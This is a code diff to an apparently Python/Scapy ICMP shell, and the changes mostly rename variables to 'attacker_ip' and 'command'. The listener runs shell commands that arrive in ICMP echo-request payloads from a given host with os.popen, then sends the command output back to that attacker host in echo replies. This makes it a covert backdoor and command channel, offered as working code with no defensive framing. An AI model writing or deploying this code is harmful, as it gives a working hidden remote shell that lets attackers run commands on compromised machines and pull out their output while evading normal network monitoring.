@@ -6,10 +6,10 @@ ICMP_ID = 13170
 time_to_live = 64
 
 def icmpshell(packet):
-    if packet[IP].src == args.destination_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
-        icmppaket = (packet[Raw].load).decode('utf-8', errors='ignore')
-        payload = os.popen(icmppaket).readlines()
-        icmppacket = (IP(dst=args.destination_ip, ttl=time_to_live)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
+    if packet[IP].src == args.attacker_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
+        command = (packet[Raw].load).decode('utf-8', errors='ignore')
+        payload = os.popen(command).readlines()
+        icmppacket = (IP(dst=args.attacker_ip, ttl=time_to_live)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
@@ -26,7 +26,7 @@ if __name__ == "__main__":
     #checks arguments passed in by user
     parser = argparse.ArgumentParser()
     parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
-    parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP adress")
+    parser.add_argument('-d', '--attacker_ip', type=str, required=True, help="Destination IP adress")
     args = parser.parse_args()
 
     print('[+] ICMP listener started')
